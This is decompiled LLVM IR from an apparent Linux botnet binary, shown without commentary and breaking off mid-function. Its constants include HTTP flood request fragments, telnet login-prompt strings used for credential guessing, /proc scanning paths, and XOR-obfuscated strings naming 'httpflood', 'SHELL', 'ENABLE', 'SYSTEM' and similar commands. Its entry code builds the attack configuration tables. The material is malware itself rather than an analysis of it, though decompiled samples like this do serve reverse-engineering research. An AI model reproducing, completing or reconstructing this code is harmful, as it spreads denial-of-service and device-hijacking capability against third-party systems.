source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8056850.2 = global i32 0
@global_var_8056868.3 = local_unnamed_addr global i32* @global_var_8056850.2
@global_var_8054b54.5 = constant [4 x i8] c"GET\00"
@global_var_8054b2d.6 = constant i32 1210056751
@global_var_8054b5f.7 = constant i32 540737568
@global_var_8054b2f.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8054b47.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8054b66.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8054b58.11 = constant [9 x i8] c"Cookie: \00"
@global_var_8054b61.12 = constant [3 x i8] c"; \00"
@global_var_8054b64.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8054b69.14 = constant i32 1952972859
@global_var_8054b6b.15 = constant [5 x i8] c"http\00"
@global_var_8054b7a.16 = constant i32 -1623588825
@global_var_8054b70.17 = constant [5 x i8] c"url=\00"
@global_var_8054b75.18 = constant [5 x i8] c"POST\00"
@global_var_8054b73.19 = constant i32 1330643005
@global_var_8054b90.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_80569c4.21 = local_unnamed_addr global i32 0
@global_var_80569c0.22 = local_unnamed_addr global i32 0
@global_var_8056940.23 = local_unnamed_addr global i32 0
@global_var_8056874.24 = local_unnamed_addr global i32 134553360
@global_var_805686c.25 = local_unnamed_addr global i32 -1
@global_var_80569bc.27 = local_unnamed_addr global i32 0
@global_var_80569cc.28 = local_unnamed_addr global i32 0
@global_var_80569ca.29 = local_unnamed_addr global i32 0
@global_var_8056948.30 = local_unnamed_addr global i32 0
@global_var_8056954.31 = local_unnamed_addr global i32 0
@global_var_805694c.32 = local_unnamed_addr global i32 0
@global_var_8056950.33 = local_unnamed_addr global i32 0
@global_var_8056990.34 = local_unnamed_addr global i32 0
@global_var_805696a.35 = local_unnamed_addr global i32 0
@global_var_8056970.36 = local_unnamed_addr global i32 0
@global_var_8056960.37 = global i32 0
@global_var_8056978.39 = local_unnamed_addr global i32 0
@global_var_8056984.40 = local_unnamed_addr global i32 0
@global_var_8056974.41 = global i32 0
@global_var_80569dc.42 = local_unnamed_addr global i32 0
@global_var_8056964.43 = local_unnamed_addr global i32 0
@global_var_805696c.44 = local_unnamed_addr global i32 0
@global_var_80569d8.45 = local_unnamed_addr global i32 0
@global_var_8054d6e.46 = constant [5 x i8] c"ogin\00"
@global_var_8054d73.47 = constant [6 x i8] c"enter\00"
@global_var_8054d79.48 = constant [8 x i8] c"assword\00"
@global_var_8056958.50 = local_unnamed_addr global i32 0
@global_var_8056988.51 = local_unnamed_addr global i32 0
@global_var_8056a00.52 = global i32 0
@global_var_8054db0.54 = constant [19 x i8] c"RKAGQVJGEMCVEE\0CON\22\00"
@global_var_8056a18.55 = local_unnamed_addr global i32 0
@global_var_8056a1c.56 = local_unnamed_addr global i32 0
@global_var_8054dc3.57 = constant [3 x i8] c"\225\00"
@global_var_8056a20.58 = local_unnamed_addr global i32 0
@global_var_8056a24.59 = local_unnamed_addr global i32 0
@global_var_8056a90.60 = local_unnamed_addr global i32 0
@global_var_8056a94.61 = local_unnamed_addr global i32 0
@global_var_8054dc6.62 = constant i32 1308673945
@global_var_8056a98.63 = local_unnamed_addr global i32 0
@global_var_8056a9c.64 = local_unnamed_addr global i32 0
@global_var_8054dc9.65 = constant i32 1448168270
@global_var_8056a10.66 = local_unnamed_addr global i32 0
@global_var_8056a14.67 = local_unnamed_addr global i32 0
@global_var_8054dd9.68 = constant i32 1381389898
@global_var_8056a28.69 = local_unnamed_addr global i32 0
@global_var_8056a2c.70 = local_unnamed_addr global i32 0
@global_var_8054df7.71 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_8056a30.72 = local_unnamed_addr global i32 0
@global_var_8056a34.73 = local_unnamed_addr global i32 0
@global_var_8054dff.74 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_8056a38.75 = local_unnamed_addr global i32 0
@global_var_8056a3c.76 = local_unnamed_addr global i32 0
@global_var_8054e05.77 = constant i32 1195772418
@global_var_8056a40.78 = local_unnamed_addr global i32 0
@global_var_8056a44.79 = local_unnamed_addr global i32 0
@global_var_8054e11.80 = constant [5 x i8] c"\0DDF\22\00"
@global_var_8056a48.81 = local_unnamed_addr global i32 0
@global_var_8056a4c.82 = local_unnamed_addr global i32 0
@global_var_8054e16.83 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_8056a50.84 = local_unnamed_addr global i32 0
@global_var_8056a54.85 = local_unnamed_addr global i32 0
@global_var_8054e1e.86 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_8056a58.87 = local_unnamed_addr global i32 0
@global_var_8056a5c.88 = local_unnamed_addr global i32 0
@global_var_8054e27.89 = constant i32 1836214128
@global_var_8056a60.90 = local_unnamed_addr global i32 0
@global_var_8056a64.91 = local_unnamed_addr global i32 0
@global_var_8054e35.92 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_8056a68.93 = local_unnamed_addr global i32 0
@global_var_8056a6c.94 = local_unnamed_addr global i32 0
@global_var_8054e40.95 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_8056a70.96 = local_unnamed_addr global i32 0
@global_var_8056a74.97 = local_unnamed_addr global i32 0
@global_var_8054fc0.98 = constant i32 437738110
@global_var_8056a78.99 = local_unnamed_addr global i32 0
@global_var_8056a7c.100 = local_unnamed_addr global i32 0
@global_var_8054e4b.101 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_8056a80.102 = local_unnamed_addr global i32 0
@global_var_8056a84.103 = local_unnamed_addr global i32 0
@global_var_8054e54.104 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_8056a88.105 = local_unnamed_addr global i32 0
@global_var_8056a8c.106 = local_unnamed_addr global i32 0
@global_var_8054e60.107 = constant [7 x i8] c"QJGNN\22\00"
@global_var_8056aa0.108 = local_unnamed_addr global i32 0
@global_var_8056aa4.109 = local_unnamed_addr global i32 0
@global_var_8054e67.110 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_8056aa8.111 = local_unnamed_addr global i32 0
@global_var_8056aac.112 = local_unnamed_addr global i32 0
@global_var_8054e6f.113 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_8056ab0.114 = local_unnamed_addr global i32 0
@global_var_8056ab4.115 = local_unnamed_addr global i32 0
@global_var_8054e77.116 = constant [4 x i8] c"QJ\22\00"
@global_var_8056ab8.117 = local_unnamed_addr global i32 0
@global_var_8056abc.118 = local_unnamed_addr global i32 0
@global_var_8054e7b.119 = constant i32 1280000013
@global_var_8056ac0.120 = local_unnamed_addr global i32 0
@global_var_8056ac4.121 = local_unnamed_addr global i32 0
@global_var_8054e8f.122 = constant i32 1668311919
@global_var_8056ac8.123 = local_unnamed_addr global i32 0
@global_var_8056acc.124 = local_unnamed_addr global i32 0
@global_var_8054ea8.125 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_8056ad0.126 = local_unnamed_addr global i32 0
@global_var_8056ad4.127 = local_unnamed_addr global i32 0
@global_var_8054eb2.128 = constant i32 1280000013
@global_var_8056ad8.129 = local_unnamed_addr global i32 0
@global_var_8056adc.130 = local_unnamed_addr global i32 0
@global_var_8054ec3.131 = constant i32 1280000013
@global_var_8056ae0.132 = local_unnamed_addr global i32 0
@global_var_8056ae4.133 = local_unnamed_addr global i32 0
@global_var_8054eda.134 = constant i32 1464693110
@global_var_8056ae8.135 = local_unnamed_addr global i32 0
@global_var_8056aec.136 = local_unnamed_addr global i32 0
@global_var_8054ef0.137 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8056af0.138 = local_unnamed_addr global i32 0
@global_var_8056af4.139 = local_unnamed_addr global i32 0
@global_var_8054f02.140 = constant i32 1196376908
@global_var_8056af8.141 = local_unnamed_addr global i32 0
@global_var_8056afc.142 = local_unnamed_addr global i32 0
@global_var_8054f0f.143 = constant i32 1280068961
@global_var_8056b00.144 = local_unnamed_addr global i32 0
@global_var_8056b04.145 = local_unnamed_addr global i32 0
@global_var_8054fe4.146 = constant i32 1195458915
@global_var_8056b08.147 = local_unnamed_addr global i32 0
@global_var_8056b0c.148 = local_unnamed_addr global i32 0
@global_var_8055038.149 = constant i32 1195458915
@global_var_8056b10.150 = local_unnamed_addr global i32 0
@global_var_8056b14.151 = local_unnamed_addr global i32 0
@global_var_805505c.152 = constant i32 1447841121
@global_var_8056b18.153 = local_unnamed_addr global i32 0
@global_var_8056b1c.154 = local_unnamed_addr global i32 0
@global_var_8054f27.155 = constant i32 1633044305
@global_var_8056b20.156 = local_unnamed_addr global i32 0
@global_var_8056b24.157 = local_unnamed_addr global i32 0
@global_var_8054f34.158 = constant i32 1346651984
@global_var_8056b28.159 = local_unnamed_addr global i32 0
@global_var_8056b2c.160 = local_unnamed_addr global i32 0
@global_var_8054f3e.161 = constant i32 1128353102
@global_var_8056b30.162 = local_unnamed_addr global i32 0
@global_var_8056b34.163 = local_unnamed_addr global i32 0
@global_var_8054f49.164 = constant i32 257312593
@global_var_8056b38.165 = local_unnamed_addr global i32 0
@global_var_8056b3c.166 = local_unnamed_addr global i32 0
@global_var_8054f56.167 = constant i32 1447841089
@global_var_8056b40.168 = local_unnamed_addr global i32 0
@global_var_8056b44.169 = local_unnamed_addr global i32 0
@global_var_8054f67.170 = constant i32 1279479894
@global_var_8056b48.171 = local_unnamed_addr global i32 0
@global_var_8056b4c.172 = local_unnamed_addr global i32 0
@global_var_8054f7b.173 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8056b50.174 = local_unnamed_addr global i32 0
@global_var_8056b54.175 = local_unnamed_addr global i32 0
@global_var_8054f1b.176 = constant i32 1380403017
@global_var_8056b58.177 = local_unnamed_addr global i32 0
@global_var_8056b5c.178 = local_unnamed_addr global i32 0
@global_var_8054f84.179 = constant i32 1280068929
@global_var_8056b60.180 = local_unnamed_addr global i32 0
@global_var_8056b64.181 = local_unnamed_addr global i32 0
@global_var_8054f91.182 = constant i32 1414547281
@global_var_8056b68.183 = local_unnamed_addr global i32 0
@global_var_8056b6c.184 = local_unnamed_addr global i32 0
@global_var_8054fa4.185 = constant i32 1414547281
@global_var_8056b70.186 = local_unnamed_addr global i32 0
@global_var_8056b74.187 = local_unnamed_addr global i32 0
@global_var_8055090.188 = constant i32 1264078191
@global_var_8056b78.189 = local_unnamed_addr global i32 0
@global_var_8056b7c.190 = local_unnamed_addr global i32 0
@global_var_8055100.191 = constant i32 1264078191
@global_var_8056b80.192 = local_unnamed_addr global i32 0
@global_var_8056b84.193 = local_unnamed_addr global i32 0
@global_var_8055170.194 = constant i32 1264078191
@global_var_8056b88.195 = local_unnamed_addr global i32 0
@global_var_8056b8c.196 = local_unnamed_addr global i32 0
@global_var_80551e0.197 = constant i32 1264078191
@global_var_8056b90.198 = local_unnamed_addr global i32 0
@global_var_8056b94.199 = local_unnamed_addr global i32 0
@global_var_8055250.200 = constant i32 1264078191
@global_var_8056b98.201 = local_unnamed_addr global i32 0
@global_var_8056b9c.202 = local_unnamed_addr global i32 0
@global_var_80569b4.203 = global i32 0
@global_var_8056ba0.204 = global i32 0
@global_var_8056880.205 = global i32 0
@global_var_8056c4c.207 = global i32 0
@global_var_8056c50.208 = local_unnamed_addr global i32 0
@global_var_8056c54.209 = global i32 0
@global_var_8056c60.210 = local_unnamed_addr global i32 0
@global_var_8056f54.211 = global i32 0
@global_var_8056f7c.212 = local_unnamed_addr global i32 0
@global_var_8056f6c.213 = local_unnamed_addr global i32 0
@global_var_8056f70.214 = local_unnamed_addr global i32 0
@global_var_8056f74.215 = local_unnamed_addr global i32 0
@global_var_8056f78.216 = local_unnamed_addr global i32 0
@global_var_8056f84.217 = local_unnamed_addr global i32 0
@global_var_8056f90.218 = local_unnamed_addr global i32 0
@global_var_8056f88.219 = local_unnamed_addr global i32 0
@global_var_8056f94.220 = local_unnamed_addr global i32 0
@global_var_8056f68.221 = local_unnamed_addr global i32 0
@global_var_8056f64.223 = local_unnamed_addr global i32 0
@global_var_8056f8c.224 = local_unnamed_addr global i32 0
@global_var_8056c5c.225 = local_unnamed_addr global i32 0
@global_var_8056898.226 = global i32 0
@global_var_8055640.228 = constant i32 33554944
@global_var_80568cc.229 = local_unnamed_addr global i32* @global_var_8055640.228
@global_var_80568b0.230 = global i32 0
@global_var_8056998.231 = local_unnamed_addr global i32 0
@global_var_8056844.233 = global i32 -1
@global_var_80540d9.234 = constant i32 -294069
@global_var_80569a8.235 = local_unnamed_addr global i32 0
@global_var_80569ac.236 = local_unnamed_addr global i32 0
@global_var_8055520.237 = constant [10 x i8] c"/dev/null\00"
@global_var_80569a4.239 = local_unnamed_addr global i32 0
@global_var_805699c.240 = local_unnamed_addr global i32 0
@global_var_80569a0.241 = local_unnamed_addr global i32 0
@global_var_8054b68.242 = constant i32 1744845568
@global_var_80568c8.243 = local_unnamed_addr global i32* @global_var_8054b68.242
@global_var_80542bf.244 = constant i32 1928542531
@global_var_80542e3.245 = constant i32 1928542531
@global_var_80569b8.246 = local_unnamed_addr global i32 0
@global_var_8056f98.247 = local_unnamed_addr global i32 0
@global_var_8056f9c.248 = local_unnamed_addr global i32 0
@global_var_80568e0.1 = local_unnamed_addr global i8 0
@global_var_8056878.26 = local_unnamed_addr global i8 1
@global_var_8056976.38 = local_unnamed_addr global i16 0
@global_var_805698c.49 = local_unnamed_addr global i16 0
@global_var_805687c.53 = local_unnamed_addr global i16 -16657
@global_var_8056c20.206 = global i8 0
@global_var_8056f80.222 = local_unnamed_addr global i8 0
@global_var_8056994.227 = local_unnamed_addr global i8 0
@global_var_80569b0.238 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 59323
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8054ae0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80568e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8056868.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8056868.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8056868.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80568e0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8056868.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80568e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134568000)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134572116 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8054175(i32 134538704, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134564614, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134564614, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134564614, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8054b54.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp135 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp135, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_8054b2d.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_80527ca(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp237 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_8051ca0(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_8051ca0(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_8051ca0(i8* %tmp237)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5211 = call i32 @function_8051ca0(i8* %tmp237)
  store i32 %v2_80482a5211, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4212 = icmp eq i32 %v2_80482a5211, 0
  store i1 %v12_80482b4212, i1* %zf.global-to-local, align 1
  %v7_80482b6213 = icmp sgt i32 %v2_80482a5211, 0
